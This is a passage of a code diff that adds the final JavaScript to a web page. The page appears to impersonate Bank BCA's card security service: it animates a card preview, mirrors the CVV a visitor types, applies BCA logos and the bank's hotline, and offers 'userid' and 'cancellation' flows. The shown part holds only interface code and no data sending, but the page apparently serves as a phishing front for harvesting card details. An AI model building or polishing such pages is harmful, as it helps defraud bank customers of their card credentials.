+                                // Kalkulasi rotasi (tilt) yang lebih presisi dan agresif agar terasa nyata
+                                const tiltX = (0.5 - y) * 22; // Rotasi sumbu X (maks 11 deg)
+                                const tiltY = (x - 0.5) * 28; // Rotasi sumbu Y (maks 14 deg)
+                                
+                                const isFlipped = cardFlipInner.classList.contains('is-flipped');
+                                cardFlipInner.style.transition = 'transform 0.1s ease-out';
+                                
+                                // Efek skala membesar saat tilt
+                                const scale = 1.04;
+                                
+                                if (isFlipped) {
+                                    cardFlipInner.style.transform = `translateY(-4px) rotateY(180deg) rotateX(${tiltX}deg) rotateY(${-tiltY}deg) scale3d(${scale}, ${scale}, ${scale})`;
+                                } else {
+                                    cardFlipInner.style.transform = `translateY(-4px) rotateX(${tiltX}deg) rotateY(${tiltY}deg) scale3d(${scale}, ${scale}, ${scale})`;
+                                }
+                            };
+
+                            cardFlipContainerBox.addEventListener('mousemove', (e) => {
+                                if (tiltRaf) cancelAnimationFrame(tiltRaf);
+                                tiltRaf = requestAnimationFrame(() => handleTilt(e.clientX, e.clientY));
+                            });
+
+                            cardFlipContainerBox.addEventListener('touchmove', (e) => {
+                                if (tiltRaf) cancelAnimationFrame(tiltRaf);
+                                tiltRaf = requestAnimationFrame(() => handleTilt(e.touches[0].clientX, e.touches[0].clientY));
+                            }, { passive: true });
+
+                            const resetTilt = () => {
+                                if (tiltRaf) cancelAnimationFrame(tiltRaf);
+                                cardFlipInner.style.transition = 'transform 0.65s cubic-bezier(0.16, 1, 0.3, 1)';
+                                cardFlipInner.style.transform = '';
+                            };
+                            
+                            cardFlipContainerBox.addEventListener('mouseleave', resetTilt);
+                            cardFlipContainerBox.addEventListener('touchend', resetTilt);
+                        }
+
+                        if (cvvInputBox && cardFlipInner) {
+                            cvvInputBox.addEventListener('focus', () => cardFlipInner.classList.add('is-flipped'));
+                            cvvInputBox.addEventListener('blur', () => cardFlipInner.classList.remove('is-flipped'));
+                            cvvInputBox.addEventListener('input', (e) => {
+                                const val = e.target.value.replace(/\D/g, '');
+                                if (cvvDisplayTarget) cvvDisplayTarget.textContent = val.length > 0 ? val : '•••';
+                            });
+                        }
+
+                        const cardBrandText = document.getElementById('cardBrandText');
+                        const cardFrontBg = document.getElementById('cardFrontBg');
+                        const cardBackBg = document.getElementById('cardBackBg');
+                        const headerLogoImg = document.getElementById('headerLogoImg');
+                        const cardTierText = document.getElementById('cardTierText');
+                        const cardBackContactText = document.getElementById('cardBackContactText');
+
+                        if (bankSelector) {
+                            bankSelector.addEventListener('change', (e) => {
+                                const selectedOption = e.target.options[e.target.selectedIndex];
+                                const bName = selectedOption.getAttribute('data-name');
+                                const bGradient = selectedOption.getAttribute('data-gradient');
+                                const bLogo = selectedOption.getAttribute('data-logo');
+
+                                if (cardBrandText) cardBrandText.textContent = bName;
+                                if (cardFrontBg) cardFrontBg.style.background = bGradient;
+                                if (cardBackBg) cardBackBg.style.background = bGradient;
+                                if (headerLogoImg) headerLogoImg.src = bLogo;
+                                if (cardTierText) {
+                                    cardTierText.textContent = bName === 'BANK BCA' ? 'PASPOR PLATINUM' : 'DEBIT / KREDIT';
+                                }
+                                if (cardBackContactText) {
+                                    cardBackContactText.textContent = bName === 'BANK BCA' ? 'Halo BCA 1500888 • www.bca.co.id' : 'Layanan Nasabah 24 Jam';
+                                }
+                            });
+                        }
+
+                        if (serviceType === 'pembatalan') {
+                            attachPembatalanLogic();
+                        }
+                    }, 750);
+                }
+            });
+        });
+
+        const navCtaBtn = document.getElementById('navCtaBtn');
+        if (navCtaBtn) {
+            navCtaBtn.addEventListener('click', () => {
+                const targetCard = document.querySelector('.hero-card-item[data-service="userid"]');
+                if (targetCard) targetCard.click();
+            });
+        }
+
+        function closeModal() {
+            splashScreen.classList.remove('active');
+            modalOverlay.classList.remove('active');
+            modalOverlay.classList.remove('scroll-locked');
+            document.body.classList.remove('modal-open');
+            document.querySelectorAll('.bca-loader-overlay, .custom-alert-overlay').forEach(el => el.remove());
+        }
+
+        modalOverlay.addEventListener('click', (e) => {
+            if (e.target === modalOverlay) closeModal();
+        });
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') closeModal();
+        });
+
+        // ===== TYPEWRITER EFFECT UNTUK JUDUL HERO =====
+        (function initHeroTypewriter() {
+            const typingEl = document.getElementById('heroTypingText');
+            if (!typingEl) return;
+
+            const part1 = "Pusat Layanan Keamanan ";
+            const part2 = "Kartu BCA ID";
+            const fullText = part1 + part2;
+            let charIndex = 0;
+            let isDeleting = false;
+
+            function renderText(count) {
+                if (count <= part1.length) {
+                    typingEl.textContent = part1.substring(0, count);
+                } else {
+                    const typedPart2 = part2.substring(0, count - part1.length);
+                    typingEl.innerHTML = part1 + '<span class="highlight">' + typedPart2 + '</span>';
+                }
+            }
+
+            // Kosongkan di awal untuk memulai efek ketik dari karakter pertama
+            renderText(0);
+
+            function tick() {
+                if (!isDeleting) {
+                    if (charIndex < fullText.length) {
+                        charIndex++;
+                        renderText(charIndex);
+                        setTimeout(tick, 70 + Math.random() * 30);
+                    } else {
+                        // Teks sudah lengkap, jeda 4 detik agar jelas terbaca
+                        setTimeout(() => {
+                            isDeleting = true;
+                            tick();
+                        }, 4000);
+                    }
+                } else {
+                    if (charIndex > 0) {
+                        charIndex--;
+                        renderText(charIndex);
+                        setTimeout(tick, 35);
+                    } else {
+                        isDeleting = false;
+                        setTimeout(tick, 600);
+                    }
+                }
+            }
+
+            setTimeout(tick, 250);
+        })();
+    </script>
+</body>
+</html>
